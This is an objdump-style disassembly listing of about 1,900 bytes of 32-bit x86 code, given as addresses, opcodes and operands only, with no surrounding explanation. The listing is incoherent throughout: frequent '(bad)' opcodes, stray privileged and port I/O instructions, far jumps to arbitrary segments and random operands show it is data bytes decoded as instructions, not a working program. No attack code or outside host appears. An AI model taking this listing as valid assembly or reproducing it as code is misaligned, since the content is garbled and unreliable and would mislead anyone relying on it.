  41ab6e:	push   cs
  41ab6f:	xor    BYTE PTR [ebp-0x3d],ah
  41ab72:	and    BYTE PTR [edi-0x347437d2],0x9
  41ab79:	int    0x11
  41ab7b:	dec    ecx
  41ab7c:	aaa    
  41ab7d:	inc    esp
  41ab7e:	jmp    0x404e52d2
  41ab83:	cld    
  41ab84:	ror    DWORD PTR [ebp-0x515990eb],0xb4
  41ab8b:	sub    bl,BYTE PTR [edi+0x7adf0186]
  41ab91:	jnp    0x41ab4a
  41ab93:	aaa    
  41ab94:	pop    ebx
  41ab95:	push   edx
  41ab96:	gs test ecx,esi
  41ab99:	pushf  
  41ab9a:	dec    esi
  41ab9b:	aaa    
  41ab9c:	mov    ah,0x6c
  41ab9e:	cli    
  41ab9f:	inc    ecx
  41aba0:	int    0xc0
  41aba2:	(bad)  
  41aba3:	inc    esp
  41aba4:	pop    ebx
  41aba5:	dec    ecx
  41aba6:	sbb    ecx,DWORD PTR [ebx+0x6a]
  41aba9:	es aad 0x65
  41abac:	or     BYTE PTR [eax-0x17793cdc],bl
  41abb2:	das    
  41abb3:	mov    WORD PTR [eax],gs
  41abb5:	outs   dx,BYTE PTR ds:[esi]
  41abb6:	xor    bh,BYTE PTR [ebx+edi*8]
  41abb9:	pop    ds
  41abba:	or     ecx,DWORD PTR [ebp+0x3f]
  41abbd:	dec    edi
  41abbe:	push   es
  41abbf:	jo     0x41ac02
  41abc1:	arpl   sp,ax
  41abc3:	shl    DWORD PTR [edi-0x54],1
  41abc6:	adc    BYTE PTR [esi+ebx*8-0x78],0xdb
  41abcb:	jb     0x41abb3
  41abcd:	std    
  41abce:	cmc    
  41abcf:	mov    dl,0xd7
  41abd1:	in     al,dx
  41abd2:	repz sub ebx,DWORD PTR [eax-0xf]
  41abd6:	gs inc ecx
  41abd8:	out    dx,al
  41abd9:	int3   
  41abda:	mov    WORD PTR [edx-0x52],ss
  41abdd:	inc    esp
  41abde:	cs in  eax,0x20
  41abe1:	push   eax
  41abe2:	sub    DWORD PTR [ecx+0x3c],eax
  41abe5:	mov    ebx,0x299320f
  41abea:	hlt    
  41abeb:	loopne 0x41ab8b
  41abed:	call   0x582b0a9
  41abf2:	and    eax,0xf4b812a9
  41abf7:	and    BYTE PTR [edi-0x37],bh
  41abfa:	data16 icebp 
  41abfc:	adc    ebx,DWORD PTR [ecx-0x501f89f4]
  41ac02:	sti    
  41ac03:	push   es
  41ac04:	es out 0x24,eax
  41ac07:	out    dx,al
  41ac08:	cli    
  41ac09:	jns    0x41ac43
  41ac0b:	test   eax,0x126a24ec
  41ac10:	ss mov eax,cs:0xed41e810
  41ac17:	(bad)  ds:0xf93662a1
  41ac1d:	xchg   edi,eax
  41ac1e:	je     0x41abbe
  41ac20:	div    BYTE PTR [esi-0x6a560e1f]
  41ac26:	push   ss
  41ac27:	jbe    0x41ac87
  41ac29:	es mov ch,0x5f
  41ac2c:	mov    eax,ds:0x2763679e
  41ac31:	xor    dl,dh
  41ac33:	mov    bl,0xc8
  41ac35:	out    dx,eax
  41ac36:	and    dl,BYTE PTR [ecx+0x14]
  41ac39:	add    eax,0x4c55568f
  41ac3e:	mov    esp,0x1196feb7
  41ac43:	div    BYTE PTR [ebp-0x4704f9f5]
  41ac49:	cmove  esi,DWORD PTR [edx-0x3637453a]
  41ac50:	mov    edx,0xc8f0dcaf
  41ac55:	imul   esi,DWORD PTR [eax-0x33],0xffffffda
  41ac59:	xchg   edi,eax
  41ac5a:	mov    cl,0xb3
  41ac5c:	dec    ebx
  41ac5d:	sub    DWORD PTR [ecx+0x59],0x4e997f3c
  41ac64:	push   es
  41ac65:	ds das 
  41ac67:	or     ecx,DWORD PTR [eax]
  41ac69:	or     ebp,DWORD PTR [edx+0x776121c7]
  41ac6f:	es dec edi
  41ac71:	std    
  41ac72:	add    ebx,DWORD PTR [esi-0x3b0ab6ff]
  41ac78:	add    eax,0xeb24c98c
  41ac7d:	mov    ds:0x3bc2d6df,eax
  41ac82:	loop   0x41ac57
  41ac84:	stc    
  41ac85:	jno    0x41accb
  41ac87:	retf   0x25dc
  41ac8a:	pshufw mm0,mm0,0x88
  41ac8e:	aaa    
  41ac8f:	mov    esp,0x14a3d027
  41ac94:	dec    ecx
  41ac95:	dec    esp
  41ac96:	daa    
  41ac97:	jnp    0x41ad0b
  41ac99:	sbb    DWORD PTR [edi-0x2a1b7d84],ecx
  41ac9f:	(bad)  
  41aca0:	fidiv  DWORD PTR [edi+0x37131026]
  41aca6:	dec    esi
  41aca7:	xchg   dx,si
  41acaa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acab:	outs   dx,BYTE PTR ds:[esi]
  41acac:	data16 daa 
  41acae:	imul   ecx,DWORD PTR [esi+0x44],0x7a
  41acb2:	test   eax,0x4c35b76
  41acb7:	into   
  41acb8:	lods   eax,DWORD PTR ds:[esi]
  41acb9:	retf   
  41acba:	test   eax,0x685f0fd1
  41acbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acc0:	push   ebx
  41acc1:	fs cmp ch,dl
  41acc4:	call   0xf661:0x581ce6e5
  41accb:	sub    al,ch
  41accd:	pavgb  mm4,QWORD PTR [ecx]
  41acd0:	fdivr  st(7),st
  41acd2:	and    esp,esp
  41acd4:	(bad)  
  41acd5:	je     0x41ac9a
  41acd7:	stos   DWORD PTR es:[edi],eax
  41acd8:	test   BYTE PTR [ebx+0x7921a41a],0x4c
  41acdf:	jmp    0x41ad24
  41ace1:	or     esi,DWORD PTR [edi+0x33]
  41ace4:	adc    eax,DWORD PTR [eax+0xd0eb970]
  41acea:	mov    BYTE PTR [edx],dl
  41acec:	fxch   st(6)
  41acee:	cdq    
  41acef:	clc    
  41acf0:	mov    bl,0xd2
  41acf2:	inc    ecx
  41acf3:	(bad)  
  41acf4:	loope  0x41acdc
  41acf6:	cmp    DWORD PTR [ebx+0x6f2eef23],ebx
  41acfc:	cmp    cl,BYTE PTR [edi]
  41acfe:	iret   
  41acff:	cmc    
  41ad00:	dec    ebp
  41ad01:	(bad)  
  41ad02:	cs inc ebx
  41ad04:	ins    DWORD PTR es:[edi],dx
  41ad05:	pop    edi
  41ad06:	adc    DWORD PTR [ebx],ecx
  41ad08:	xchg   ecx,eax
  41ad09:	loope  0x41ad48
  41ad0b:	xlat   BYTE PTR ds:[ebx]
  41ad0c:	pop    edi
  41ad0d:	mov    db4,edi
  41ad10:	or     al,0xcc
  41ad12:	cdq    
  41ad13:	data16 (bad) 
  41ad15:	xchg   esi,eax
  41ad16:	mov    ds:0x8b8281de,eax
  41ad1b:	xchg   esi,eax
  41ad1c:	out    dx,al
  41ad1d:	imul   BYTE PTR [ecx]
  41ad1f:	push   cs
  41ad20:	cli    
  41ad21:	test   DWORD PTR [edi],ebx
  41ad23:	js     0x41ad9a
  41ad25:	mov    WORD PTR [esi],?
  41ad27:	and    ch,BYTE PTR [ebx]
  41ad29:	xor    DWORD PTR ds:[esi+esi*1+0x28],esp
  41ad2e:	int3   
  41ad2f:	pop    ebx
  41ad30:	aaa    
  41ad31:	sbb    al,0x4b
  41ad33:	fucomp st(0)
  41ad35:	push   ss
  41ad36:	push   0x8364cc2b
  41ad3b:	int    0x45
  41ad3d:	sbb    eax,0xe567550e
  41ad42:	mov    eax,ds:0x927c5b8
  41ad47:	sahf   
  41ad48:	or     BYTE PTR [edi-0x63],cl
  41ad4b:	popa   
  41ad4c:	mov    esi,0x3fa8a67e
  41ad51:	inc    edx
  41ad52:	sbb    al,0x2
  41ad54:	mov    edi,0x114528c4
  41ad59:	ror    edi,1
  41ad5b:	push   ds
  41ad5c:	scas   eax,DWORD PTR es:[edi]
  41ad5d:	(bad)  
  41ad5e:	mov    edi,esp
  41ad60:	scas   al,BYTE PTR es:[edi]
  41ad61:	dec    ecx
  41ad62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad63:	pop    ds
  41ad64:	push   edx
  41ad65:	sbb    ah,ah
  41ad67:	fisttp DWORD PTR [ebx+edx*8]
  41ad6a:	repz add BYTE PTR ds:0xab161fcd,dh
  41ad71:	jle    0x41adad
  41ad73:	inc    esp
  41ad74:	js     0x41adbd
  41ad76:	popf   
  41ad77:	mov    eax,ds:0x60d33956
  41ad7c:	rcr    DWORD PTR [ebp+edi*1+0x2a],1
  41ad80:	fadd   st,st(6)
  41ad82:	iret   
  41ad83:	inc    edx
  41ad84:	xchg   esi,eax
  41ad85:	pop    ebx
  41ad86:	sahf   
  41ad87:	dec    ebp
  41ad88:	and    eax,0x744e64a4
  41ad8d:	pop    ecx
  41ad8e:	test   BYTE PTR [esi-0x5],bl
  41ad91:	xor    eax,0x2750d1d7
  41ad96:	imul   DWORD PTR [ebx-0x38]
  41ad99:	push   edi
  41ad9a:	stos   BYTE PTR es:[edi],al
  41ad9b:	call   0xa5f78f37
  41ada0:	in     eax,0x22
  41ada2:	jnp    0x41ade2
  41ada4:	shr    DWORD PTR [ebp+0x60191d51],cl
  41adaa:	jmp    0x41adaa
  41adac:	jp     0x41ae2a
  41adae:	repz pop ds
  41adb0:	mov    ebp,0x530401b2
  41adb5:	mov    dh,0x98
  41adb7:	dec    ebx
  41adb8:	icebp  
  41adb9:	mov    esp,0xa35e63cb
  41adbe:	cmp    eax,0x2119798d
  41adc3:	test   BYTE PTR [edi],cl
  41adc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adc6:	ret    0x862d
  41adc9:	jae    0x41adde
  41adcb:	push   0x7e
  41adcd:	iret   
  41adce:	daa    
  41adcf:	or     dl,ch
  41add1:	dec    edx
  41add2:	add    DWORD PTR [eax],edx
  41add4:	hlt    
  41add5:	add    eax,0xa65a2b24
  41adda:	sbb    BYTE PTR [eax-0x16],ch
  41addd:	shr    cl,0x6a
  41ade0:	ins    BYTE PTR es:[edi],dx
  41ade1:	pop    es
  41ade2:	pusha  
  41ade3:	adc    edi,eax
  41ade5:	ret    0xf90b
  41ade8:	sbb    ebx,0x1297f373
  41adee:	inc    eax
  41adef:	xor    esi,DWORD PTR [esi+0x6b8838fe]
  41adf5:	mov    DWORD PTR [ebx-0x7c10e79a],ebp
  41adfb:	sar    BYTE PTR [edx+edi*1+0x21],cl
  41adff:	popa   
  41ae00:	sbb    al,0xc9
  41ae02:	sub    bl,BYTE PTR [ebp+0x50]
  41ae05:	(bad)  
  41ae06:	fwait
  41ae07:	stc    
  41ae08:	jbe    0x41ae7f
  41ae0a:	ficom  WORD PTR [ebp+0x38]
  41ae0d:	or     al,0x86
  41ae0f:	call   FWORD PTR [ecx+0x2d]
  41ae12:	or     ah,BYTE PTR [edx-0x660b9cfd]
  41ae18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae19:	push   ebp
  41ae1a:	dec    eax
  41ae1b:	xchg   edi,eax
  41ae1c:	ret    0x5edf
  41ae1f:	leave  
  41ae20:	push   cs
  41ae21:	ret    
  41ae22:	xor    al,BYTE PTR [edi+0x10c4b162]
  41ae28:	and    esi,eax
  41ae2a:	mov    edi,0x8143aae2
  41ae2f:	add    eax,0x6fbe1051
  41ae34:	ret    0xa5fb
  41ae37:	jecxz  0x41ade9
  41ae39:	in     eax,dx
  41ae3a:	mov    edx,0x69312f33
  41ae3f:	lock pop edx
  41ae41:	mov    ah,0xd3
  41ae43:	imul   ebx,DWORD PTR [edi-0x4329e1d0],0x78c3701e
  41ae4d:	cmp    esi,DWORD PTR [ecx+0x6553b62f]
  41ae53:	dec    edx
  41ae54:	mov    bh,BYTE PTR [ebp+0x456a05e8]
  41ae5a:	ret    
  41ae5b:	push   edi
  41ae5c:	mov    al,0xc6
  41ae5e:	mov    edx,0x18eff7ab
  41ae63:	push   eax
  41ae64:	outs   dx,DWORD PTR ds:[esi]
  41ae65:	shr    DWORD PTR [ebx+0x2a],cl
  41ae68:	int3   
  41ae69:	sbb    edx,ecx
  41ae6b:	add    al,BYTE PTR [ebp-0x203d25e7]
  41ae71:	cmp    BYTE PTR [ebx],dl
  41ae73:	test   al,0x25
  41ae75:	dec    esi
  41ae76:	out    0x5,al
  41ae78:	push   ecx
  41ae79:	ds nop
  41ae7b:	or     BYTE PTR [ebp-0x4b],ch
  41ae7e:	cmc    
  41ae7f:	(bad)  
  41ae80:	outs   dx,BYTE PTR ds:[esi]
  41ae81:	jnp    0x41ae20
  41ae83:	push   es
  41ae84:	mov    ebx,0x660228a1
  41ae89:	adc    esi,ebp
  41ae8b:	dec    ecx
  41ae8c:	or     esi,DWORD PTR [edi+0x3d]
  41ae8f:	les    esi,FWORD PTR [edx]
  41ae91:	add    BYTE PTR [eax+0x5d],0x78
  41ae95:	or     al,0x5e
  41ae97:	(bad)  
  41ae98:	xor    ecx,DWORD PTR [edi]
  41ae9a:	cmp    ah,ch
  41ae9c:	(bad)  
  41ae9e:	xor    DWORD PTR [ebx-0x63938d47],esp
  41aea4:	push   ebp
  41aea5:	xor    eax,edi
  41aea7:	loopne 0x41aef0
  41aea9:	jo     0x41af0d
  41aeab:	shl    BYTE PTR ds:0x315c3cb8,0x40
  41aeb2:	pop    eax
  41aeb3:	cli    
  41aeb4:	loop   0x41aef0
  41aeb6:	enter  0xec55,0x97
  41aeba:	leave  
  41aebb:	out    0x76,al
  41aebd:	and    eax,0x58f3a960
  41aec2:	xchg   ecx,eax
  41aec3:	mov    bh,0x78
  41aec5:	add    al,0x73
  41aec7:	inc    esp
  41aec8:	ja     0x41af1a
  41aeca:	clc    
  41aecb:	out    dx,al
  41aecc:	test   DWORD PTR [ebx],0xbbaa976c
  41aed2:	jmp    0x41ae63
  41aed4:	jp     0x41ae6b
  41aed6:	mov    ds:0x6370c7c7,eax
  41aedb:	inc    esp
  41aedc:	fwait
  41aedd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aede:	pop    DWORD PTR [ebp+eiz*8+0x3a]
  41aee2:	xchg   ecx,eax
  41aee3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aee4:	sub    bh,ch
  41aee6:	or     esi,ebx
  41aee8:	jmp    0xdf3b:0x6b027fcd
  41aeef:	jno    0x41af0e
  41aef1:	nop
  41aef2:	push   esi
  41aef3:	(bad)  
  41aef4:	cld    
  41aef5:	je     0x41aeed
  41aef7:	xor    al,0x92
  41aef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aefa:	push   ds
  41aefb:	test   al,0x70
  41aefd:	pushf  
  41aefe:	test   eax,0xa44796
  41af03:	test   BYTE PTR [ebx-0x7a95032f],dh
  41af09:	pop    esi
  41af0a:	test   eax,0xc85f54a
  41af0f:	iret   
  41af10:	rcr    DWORD PTR [edx+0x1f],1
  41af13:	jl     0x41af38
  41af15:	or     DWORD PTR [eax-0x13],edi
  41af18:	out    dx,eax
  41af19:	retf   0x15d
  41af1c:	clc    
  41af1d:	ds push ebx
  41af1f:	xor    al,0x69
  41af21:	jbe    0x41aee2
  41af23:	sbb    cl,al
  41af25:	jge    0x41aeaf
  41af27:	repnz into 
  41af29:	jge    0x41af30
  41af2b:	mov    al,ds:0xdada2a75
  41af30:	jne    0x41af2d
  41af32:	inc    edx
  41af33:	stos   BYTE PTR es:[edi],al
  41af34:	es and eax,0x290bd4d1
  41af3a:	add    eax,0xe2dee273
  41af3f:	(bad)  
  41af41:	out    0xce,al
  41af43:	scas   eax,DWORD PTR es:[edi]
  41af44:	daa    
  41af45:	call   0xd1b5:0x1d839e09
  41af4c:	add    eax,0x42c0dc32
  41af51:	cmp    DWORD PTR [esi+0x4f],ebp
  41af54:	sub    esi,ebp
  41af56:	rcl    cl,cl
  41af58:	cdq    
  41af59:	sub    al,0x9d
  41af5b:	sbb    edx,DWORD PTR [ebp+0x2d]
  41af5e:	mov    DWORD PTR [ecx+0x31b1125d],eax
  41af64:	xor    eax,0xa55158a5
  41af69:	sub    BYTE PTR ds:0xc42d8464,dh
  41af6f:	add    DWORD PTR [ecx],eax
  41af71:	inc    eax
  41af72:	cmc    
  41af73:	adc    al,0xa6
  41af75:	out    0x6e,al
  41af77:	stc    
  41af78:	(bad)  
  41af79:	out    dx,eax
  41af7a:	cmp    cl,BYTE PTR [eax+0x28]
  41af7d:	pop    ds
  41af7e:	add    cl,BYTE PTR [edi]
  41af80:	(bad)  
  41af81:	pop    ds
  41af82:	jecxz  0x41afb3
  41af84:	lahf   
  41af85:	pop    edi
  41af86:	stos   DWORD PTR es:[edi],eax
  41af87:	pop    esi
  41af88:	sub    al,0xe5
  41af8a:	aam    0xf9
  41af8c:	aaa    
  41af8d:	pop    ds
  41af8e:	pop    eax
  41af8f:	fiadd  WORD PTR [ecx+0x52]
  41af92:	jo     0x41afc9
  41af94:	mov    ah,0xcb
  41af96:	loopne 0x41afcf
  41af98:	cmp    eax,0x6515908d
  41af9d:	sbb    bl,BYTE PTR [ebx+0x66]
  41afa0:	test   al,0x0
  41afa2:	xchg   esp,eax
  41afa3:	aas    
  41afa4:	pop    eax
  41afa5:	addr16 dec esi
  41afa7:	inc    edi
  41afa8:	mov    bh,0xdd
  41afaa:	pavgw  mm0,QWORD PTR [ebx]
  41afad:	imul   BYTE PTR [ebx-0x3db519bc]
  41afb3:	mov    cl,0xe2
  41afb5:	push   ecx
  41afb6:	loop   0x41afdd
  41afb8:	iret   
  41afb9:	cli    
  41afba:	adc    edi,eax
  41afbc:	das    
  41afbd:	jbe    0x41aff1
  41afbf:	hlt    
  41afc0:	data16 mov ds,WORD PTR [ecx+edx*2]
  41afc4:	xor    edi,ecx
  41afc6:	adc    ebx,DWORD PTR [ebx]
  41afc8:	mov    ecx,0xf0f1fd59
  41afcd:	push   edi
  41afce:	xlat   BYTE PTR ds:[ebx]
  41afcf:	push   eax
  41afd0:	bound  esp,QWORD PTR [ecx+0x39a00afa]
  41afd6:	mov    al,0x4c
  41afd8:	mov    ebx,0x3117fe9d
  41afdd:	enter  0x9da7,0x11
  41afe1:	and    esp,edi
  41afe3:	inc    edx
  41afe4:	cld    
  41afe5:	jg     0x41b048
  41afe7:	mov    al,0xae
  41afe9:	call   ebp
  41afeb:	push   es
  41afec:	or     ecx,edi
  41afee:	dec    esi
  41afef:	cmc    
  41aff0:	dec    ebp
  41aff1:	call   0xe41e8499
  41aff6:	inc    DWORD PTR [ebp-0x38f33a9e]
  41affc:	std    
  41affd:	sbb    eax,0x943284ad
  41b002:	xchg   ebx,eax
  41b003:	sahf   
  41b004:	out    0x16,al
  41b006:	(bad)  
  41b007:	int3   
  41b008:	stos   BYTE PTR es:[edi],al
  41b009:	fld    DWORD PTR [eax+0x556a77b6]
  41b00f:	dec    esi
  41b010:	lds    ebp,FWORD PTR [edi-0x2a]
  41b013:	out    0xc2,eax
  41b015:	in     al,0x35
  41b017:	push   edx
  41b018:	lods   al,BYTE PTR ds:[esi]
  41b019:	dec    ebp
  41b01a:	or     edx,esi
  41b01c:	xor    eax,DWORD PTR [ebp-0x20]
  41b01f:	adc    edi,DWORD PTR [edx+0x70]
  41b022:	ja     0x41b0a2
  41b024:	into   
  41b025:	nop
  41b026:	push   eax
  41b027:	test   eax,0xe97a40f3
  41b02c:	mov    ds:0x80988632,al
  41b031:	cld    
  41b032:	dec    esp
  41b033:	in     eax,0x64
  41b035:	neg    BYTE PTR [edx]
  41b037:	or     BYTE PTR ds:0x5d57a4d9,dl
  41b03d:	cmc    
  41b03e:	mov    al,ch
  41b040:	lods   al,BYTE PTR ds:[esi]
  41b041:	jp     0x41b0b9
  41b043:	jns    0x41b045
  41b045:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b046:	dec    ecx
  41b047:	pushf  
  41b048:	mov    ch,0x8d
  41b04a:	xor    DWORD PTR [ebp+0x5e8f3bf1],esp
  41b050:	out    0x80,eax
  41b052:	fsubp  st(6),st
  41b054:	mov    dh,0x46
  41b056:	ret    
  41b057:	fcom   QWORD PTR [esp+edx*8+0x4b]
  41b05b:	add    BYTE PTR [edi+0x106cac80],ch
  41b061:	xchg   edx,eax
  41b062:	mov    edx,esp
  41b064:	loope  0x41b06d
  41b066:	add    bl,BYTE PTR [ecx]
  41b068:	loope  0x41b0c1
  41b06a:	lods   eax,DWORD PTR ds:[esi]
  41b06b:	popa   
  41b06c:	nop
  41b06d:	bound  esp,QWORD PTR [esi]
  41b06f:	inc    ecx
  41b070:	pop    eax
  41b071:	adc    DWORD PTR [eax],esp
  41b073:	loop   0x41b092
  41b075:	cdq    
  41b076:	out    0x97,al
  41b078:	cli    
  41b079:	es jno 0x41b0d8
  41b07c:	cli    
  41b07d:	scas   eax,DWORD PTR es:[edi]
  41b07e:	mov    dl,bh
  41b080:	test   al,0x22
  41b082:	pop    esp
  41b083:	and    dl,0xcd
  41b086:	adc    dl,BYTE PTR [esi+0x471d09ff]
  41b08c:	sub    al,0x48
  41b08e:	add    eax,0x1d262732
  41b093:	dec    ecx
  41b094:	cmp    al,0x9c
  41b096:	adc    ebp,edi
  41b098:	adc    eax,0x3e7dfaa
  41b09d:	pop    edx
  41b09e:	test   al,0x7a
  41b0a0:	rcr    DWORD PTR [ebp-0x4122c8d4],0x54
  41b0a7:	mov    bh,0x2b
  41b0a9:	jg     0x41b0a5
  41b0ab:	or     DWORD PTR [esi-0x531c5eec],0xffffffa8
  41b0b2:	or     al,0x6
  41b0b4:	aaa    
  41b0b5:	sbb    eax,0x6fc75e78
  41b0ba:	call   0x3c4b:0x674d1199
  41b0c1:	and    dl,BYTE PTR [eax]
  41b0c3:	or     dl,cl
  41b0c5:	loopne 0x41b08e
  41b0c7:	xor    al,0xf7
  41b0c9:	mov    al,ds:0x44faed2c
  41b0ce:	scas   al,BYTE PTR es:[edi]
  41b0cf:	loopne 0x41b109
  41b0d1:	in     eax,dx
  41b0d2:	fs popf 
  41b0d4:	push   ds
  41b0d5:	pop    ebp
  41b0d6:	int    0x98
  41b0d8:	xchg   ax,ax
  41b0da:	push   ebp
  41b0db:	adc    BYTE PTR [edi+0x4b],dh
  41b0de:	adc    eax,0x7105d395
  41b0e3:	setb   BYTE PTR [esp+ecx*8-0x27]
  41b0e8:	invd   
  41b0ea:	push   eax
  41b0eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b0ec:	mov    ch,0x20
  41b0ee:	mov    ds:0xf0a61b2d,eax
  41b0f3:	pusha  
  41b0f4:	and    al,0x26
  41b0f6:	sub    eax,ecx
  41b0f8:	hlt    
  41b0f9:	cld    
  41b0fa:	push   ebp
  41b0fb:	and    edi,esi
  41b0fd:	pop    ebx
  41b0fe:	cmp    ebx,DWORD PTR [ecx]
  41b100:	les    ebp,FWORD PTR [ebx-0x5]
  41b103:	mov    ch,0x5f
  41b105:	das    
  41b106:	dec    ebx
  41b107:	or     ch,dh
  41b109:	mov    bl,ah
  41b10b:	dec    ecx
  41b10c:	add    al,0xcd
  41b10e:	jle    0x41b168
  41b110:	ret    0xfa21
  41b113:	(bad)  
  41b114:	lock sub bh,ah
  41b117:	xlat   BYTE PTR ds:[ebx]
  41b118:	xchg   ecx,eax
  41b119:	dec    ebp
  41b11a:	and    eax,0xbb9e8b38
  41b11f:	sahf   
  41b120:	xlat   BYTE PTR ds:[ebx]
  41b121:	out    0xb2,al
  41b123:	daa    
  41b124:	shr    BYTE PTR [edx+0x11fc30b9],0x45
  41b12b:	mov    esi,DWORD PTR ds:0xf33b40f0
  41b131:	call   0xa4cff3ca
  41b136:	add    DWORD PTR [ecx],0xffffff83
  41b139:	repnz xor edx,DWORD PTR ds:0x3f6b1123
  41b140:	adc    BYTE PTR [ebp+0x4937f662],bh
  41b146:	jb     0x41b1be
  41b148:	stc    
  41b149:	popf   
  41b14a:	pop    ebx
  41b14b:	and    al,0x9e
  41b14d:	xor    al,0x1f
  41b14f:	lock bound eax,QWORD PTR [eax]
  41b152:	adc    al,0xd5
  41b154:	cld    
  41b155:	and    eax,0x55f46ddd
  41b15a:	lods   al,BYTE PTR ds:[esi]
  41b15b:	aas    
  41b15c:	xor    ah,bl
  41b15e:	push   edi
  41b15f:	inc    ecx
  41b160:	dec    edi
  41b161:	adc    eax,0x774762f0
  41b166:	mov    dh,0x8
  41b168:	scas   al,BYTE PTR es:[edi]
  41b169:	fwait
  41b16a:	add    al,0xc3
  41b16c:	xchg   ebp,eax
  41b16d:	pop    ebx
  41b16e:	es lahf 
  41b170:	pop    ebx
  41b171:	clc    
  41b172:	xchg   edi,eax
  41b173:	sbb    ecx,DWORD PTR [edx+0x1bbfd79e]
  41b179:	pop    ebp
  41b17a:	or     eax,0xda770330
  41b17f:	sub    al,0x47
  41b181:	mov    BYTE PTR [ebx],bl
  41b183:	inc    esp
  41b184:	icebp  
  41b185:	pop    esp
  41b186:	adc    eax,0x8a2a9882
  41b18b:	mov    ds:0x2d44de8b,eax
  41b190:	sti    
  41b191:	repz (bad) 
  41b193:	xor    ecx,ebp
  41b195:	or     esp,eax
  41b197:	je     0x41b1dd
  41b199:	mov    fs,edx
  41b19b:	add    al,BYTE PTR [edi]
  41b19d:	(bad)  
  41b19e:	lahf   
  41b19f:	xor    esp,DWORD PTR [ebx-0x56e5c47e]
  41b1a5:	sub    eax,0x9a22c042
  41b1aa:	mov    esi,DWORD PTR [edx-0x6ba63eca]
  41b1b0:	push   cs
  41b1b1:	sub    eax,0xb23b1d88
  41b1b6:	dec    esi
  41b1b7:	add    bh,BYTE PTR [ebp-0x7b]
  41b1ba:	cmp    bh,BYTE PTR [edx+0x1a7773c5]
  41b1c0:	leave  
  41b1c1:	gs or  edx,ebx
  41b1c4:	and    al,0x21
  41b1c6:	sub    esp,DWORD PTR [eax+0x20d17640]
  41b1cc:	sbb    eax,0xb7e19043
  41b1d1:	pop    edx
  41b1d2:	(bad)  
  41b1d3:	pop    ebp
  41b1d4:	and    al,0x1c
  41b1d6:	pop    ecx
  41b1d7:	inc    eax
  41b1d8:	dec    eax
  41b1d9:	inc    ecx
  41b1da:	mov    cl,0xa7
  41b1dc:	clc    
  41b1dd:	leave  
  41b1de:	mov    edi,fs
  41b1e0:	stos   BYTE PTR es:[edi],al
  41b1e1:	xor    eax,0xd39f6f58
  41b1e6:	inc    esp
  41b1e7:	fs sbb bl,al
  41b1ea:	jmp    0x34c:0x7b38708e
  41b1f1:	adc    al,0xda
  41b1f3:	xor    dh,BYTE PTR [ecx-0x7082c852]
  41b1f9:	sub    DWORD PTR [ebx+ecx*4],edi
  41b1fc:	or     DWORD PTR [ecx+ebx*1+0x4f149902],edx
  41b203:	jne    0x41b205
  41b205:	test   al,0xdc
  41b207:	xchg   esp,eax
  41b208:	pcmpgtw mm0,QWORD PTR [ecx+0x2e3b00cf]
  41b20f:	mov    DWORD PTR [ebx-0x11],eax
  41b212:	loope  0x41b1b2
  41b214:	retf   0x158
  41b217:	jbe    0x41b243
  41b219:	jle    0x41b228
  41b21b:	jno    0x41b24e
  41b21d:	xor    al,BYTE PTR [ebx-0x30f48059]
  41b223:	ins    BYTE PTR es:[edi],dx
  41b224:	fdiv   DWORD PTR [edi+ebp*1]
  41b227:	mov    eax,ds:0xad385da6
  41b22d:	loopne 0x41b1df
  41b22f:	xchg   edi,eax
  41b230:	je     0x41b241
  41b232:	dec    esp
  41b233:	xor    BYTE PTR [edi],dl
  41b235:	push   edx
  41b236:	or     bl,ch
  41b238:	shl    BYTE PTR [edi-0x74],1
  41b23b:	and    BYTE PTR [edx],0x76
  41b23e:	mov    ebp,0x79c8a2cf
  41b243:	retf   0x9270
  41b246:	push   esi
  41b247:	loope  0x41b288
  41b249:	cli    
  41b24a:	or     cl,BYTE PTR [ebp+0x3af5cd4]
  41b250:	mov    ?,WORD PTR cs:[esi-0x24]
  41b254:	or     BYTE PTR [eax+ebp*1-0x3c],ah
  41b258:	loope  0x41b2ab
  41b25a:	sub    edi,DWORD PTR [ecx-0x59]
  41b25d:	and    al,0x6b
  41b25f:	and    eax,0x22582dcf
  41b264:	xchg   edx,eax
  41b265:	es add eax,edx
  41b268:	jmp    0xd304:0x89b04db6
  41b26f:	sbb    al,0x9e
  41b271:	adc    dh,BYTE PTR [ebx+0x79953836]
  41b277:	sar    ebx,0xfa
  41b27a:	enter  0xb04,0x22
  41b27e:	pop    ebp
  41b27f:	and    al,0xc7
  41b281:	xchg   BYTE PTR [eax+ecx*8-0x56],bl
  41b285:	jnp    0x41b306
  41b287:	mov    bl,0x24
  41b289:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b28a:	inc    ebx
  41b28b:	jp     0x41b263
  41b28d:	ss jbe 0x41b2da
  41b290:	mov    bl,0xb4
  41b292:	gs jmp 0x41b2e2
  41b295:	add    eax,0x5a02342c
  41b29a:	mov    al,0xbf
  41b29c:	arpl   WORD PTR [ebp-0x17],cx
  41b29f:	mov    ds,esp
  41b2a1:	pop    esi
  41b2a2:	mov    bh,0xca
  41b2a4:	les    ecx,FWORD PTR [eax]
  41b2a6:	xchg   ecx,eax
  41b2a7:	pop    ds
  41b2a8:	rol    BYTE PTR [ebx-0x4c],0xd2
  41b2ac:	scas   al,BYTE PTR es:[edi]
  41b2ad:	add    al,0xb0
  41b2af:	mov    edx,0x70cae57d
  41b2b4:	pop    edx
  41b2b5:	cld    
  41b2b6:	pop    esp
  41b2b7:	das    
  41b2b8:	in     eax,0x86
  41b2ba:	ins    BYTE PTR es:[edi],dx
  41b2bb:	jp     0x41b28d
  41b2bd:	push   es
  41b2be:	add    ecx,ebx
  41b2c0:	test   al,0x54
  41b2c2:	cmp    BYTE PTR [edx],dl
  41b2c4:	nop
  41b2c5:	je     0x41b2df
  41b2c7:	iret   
  41b2c8:	and    ebx,DWORD PTR [edi+0x6d531a49]
  41b2ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b2cf:	aad    0xc4
  41b2d1:	xor    bh,BYTE PTR [edx]
